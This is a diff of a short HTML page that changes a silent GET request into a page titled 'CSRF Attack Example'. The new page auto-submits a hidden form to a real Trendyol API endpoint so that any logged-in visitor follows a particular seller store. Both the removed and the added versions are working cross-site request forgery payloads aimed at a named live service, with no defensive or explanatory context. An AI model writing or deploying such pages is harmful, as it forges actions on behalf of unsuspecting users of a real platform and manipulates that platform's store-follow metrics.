@@ -1,15 +1,17 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>API İsteği</title>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Example</title>
 </head>
 <body>
-    <p>API isteği gönderildi.</p>
-    <script>
-        fetch("https://apigw.trendyol.com/discovery-sfint-product-service/api/seller-store-follow/follow-store/follow?sellerId=1106958")
-        .catch(() => {}); // Hataları görmezden gelir
-    </script>
+  <form id="csrfForm" action="https://apigw.trendyol.com/discovery-sellerstore-webgw-service/v1/follow/" method="POST">
+    <input type="hidden" name="sellerId" value="1066466">
+    <input type="hidden" name="channelId" value="1">
+  </form>
+
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
 </body>
 </html>
